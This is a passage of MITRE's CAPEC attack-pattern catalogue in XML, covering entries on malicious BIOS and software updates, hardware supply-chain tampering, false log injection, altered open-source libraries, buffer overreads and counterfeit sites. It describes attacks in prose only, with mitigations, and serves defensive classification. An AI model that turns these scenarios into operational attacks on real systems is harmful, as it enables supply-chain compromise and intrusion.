         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge about the installed target system design.</Prerequisite>
            <Prerequisite>Advanced knowledge about the download and update installation processes.</Prerequisite>
            <Prerequisite>Access to the download and update system(s) used to deliver BIOS images.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.</Example>
         </Example_Instances>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1019</Entry_ID>
               <Entry_Name>System Firmware</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Altered BIOS Installed After Installation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="533" Name="Malicious Manual Software Update" Abstraction="Detailed" Status="Draft">
         <Description>An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in his or her arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="186"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge about the download and update installation processes.</Prerequisite>
            <Prerequisite>Advanced knowledge about the deployed system and its various software subcomponents and processes.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop malicious code that can be used on the victim's system while maintaining normal functionality.</Skill>
         </Skills_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="494"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Malicious Software Update</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="534" Name="Malicious Hardware Update" Abstraction="Standard" Status="Stable">
         <Description>An adversary introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an adversary can leverage known defects to obtain a desired malicious impact.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="440"/>
         </Related_Attack_Patterns>
         <Skills_Required>
            <Skill Level="High">Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An adversary develops a malicious networking card that allows for normal function plus the addition of malicious functionality that is of benefit to the adversary. The adversary sends the victim an email stating that the existing networking card is faulty, and that the victim can order a replacement card free of charge. The victim orders the card, and the adversary sends the malicious networking card. The malicious networking card replaces the perfectly-functioning original networking card, and the adversary is able to take advantage of the additional malicious functionality to further compromise the victim's network.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="535" Name="Malicious Gray Market Hardware" Abstraction="Detailed" Status="Draft">
         <Description>An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="531"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Physical access to a gray market reseller's hardware components supply, or the ability to appear as a gray market reseller to the victim's buyer.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker develops co-processor boards with malicious capabilities that are technically the same as a manufacturer's expensive upgrade to their flagship system. The victim has installed the manufacturer's base system without the expensive upgrade. The attacker contacts the victim and states they have the co-processor boards at a drastically-reduced price, falsely stating they were acquired from a bankruptcy liquidation of a company that had purchased them from the manufacturer. The victim after hearing the drastically reduced price decides to take advantage of the situation and purchases the upgrades from the attacker, and installs them. This allows the attacker to further compromise the victim.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="536" Name="Data Injected During Configuration" Abstraction="Detailed" Status="Stable">
         <Description>An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="176"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.</Prerequisite>
            <Prerequisite>Advanced knowledge of software and hardware capabilities of a manufacturer's product.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="537" Name="Infiltration of Hardware Development Environment" Abstraction="Detailed" Status="Draft">
         <Description>An attacker, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).</Prerequisite>
            <Prerequisite>The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.</Prerequisite>
            <Prerequisite>The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Intelligence about the manufacturer's operating environment and infrastructure.</Skill>
            <Skill Level="High">Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.</Skill>
            <Skill Level="High">Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The attacker is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="125"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="538" Name="Open Source Libraries Altered" Abstraction="Detailed" Status="Stable">
         <Description>An attacker with access to an open source code project and knowledge of its particular use for in a system being developed, manufactured, or supported for the victim, can insert malicious code into the open source software used for math libraries in anticipation of inclusion into the system for the purpose of disruption or further compromise within the victim organization.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The attacker commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met, and the attacker is able to sniff plaintext traffic thought to be encrypted, allowing the attacker to gain access to sensitive data of the victim.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="539" Name="ASIC With Malicious Functionality" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.</Prerequisite>
            <Prerequisite>Advanced knowledge about the ASIC installed within the target system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="54" Name="Query System for Information" Abstraction="Standard" Status="Draft">
         <Description>An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="116"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine user-controllable parameters of the application</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>Inject each parameter with content that causes an error condition to manifest</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Modify the content of each parameter according to observed error conditions</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>Repeat above steps with enough parameters until the application has been sufficiently mapped out to launch desired attack (for example, Blind SQL Injection)</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Although fuzzing parameters is not difficult, and often possible with automated fuzzers, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the attacker.</xhtml:p>
               <xhtml:p>The Attack does not need special hardware, software, skills, or access.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Application designers can construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are cataloged and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.</Mitigation>
            <Mitigation>Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705</Example>
            <Example>
               <xhtml:p>Attacker sends bad data at various servlets in a J2EE system, records returned exception stack traces, and maps application functionality.</xhtml:p>
               <xhtml:p>In addition, this technique allows attackers to correlate those servlets used with the underlying open source packages (and potentially version numbers) that provide them.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="209"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Probe Application Error Reporting</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="540" Name="Overread Buffers" Abstraction="Standard" Status="Draft">
         <Description>An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="123"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>For this type of attack to be successful, a few prerequisites must be met. First, the targeted software must be written in a language that enables fine grained buffer control. (e.g., c, c++) Second, the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally, the adversary must have the capability to influence the input that guides these buffer operations.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>By reading outside the boundary of the intended buffer, the adversary is potentially able to see any data that is stored on the disk. This could include secret keys, personal information, and sensitive files.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Note>Depending on the use of the target buffer, an application or system crash can be achieved.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="125"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="541" Name="Application Fingerprinting" Abstraction="Standard" Status="Draft">
         <Description>An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="224"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="542" Name="Targeted Malware" Abstraction="Standard" Status="Draft">
         <Description>An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="549"/>
         </Related_Attack_Patterns>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1035</Entry_ID>
               <Entry_Name>Service Execution</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="543" Name="Counterfeit Websites" Abstraction="Detailed" Status="Draft">
         <Description>Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="98"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="611"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="630"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="631"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="632"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="544" Name="Counterfeit Organizations" Abstraction="Detailed" Status="Draft">
         <Description>An adversary creates a false front organizations with the appearance of a legitimate supplier in the critical life cycle path that then injects corrupted/malicious information system components into the organizational supply chain.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="545" Name="Pull Data from System Resources" Abstraction="Standard" Status="Draft">
         <Description>An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="116"/>
         </Related_Attack_Patterns>
         <Taxonomy_Mappings>
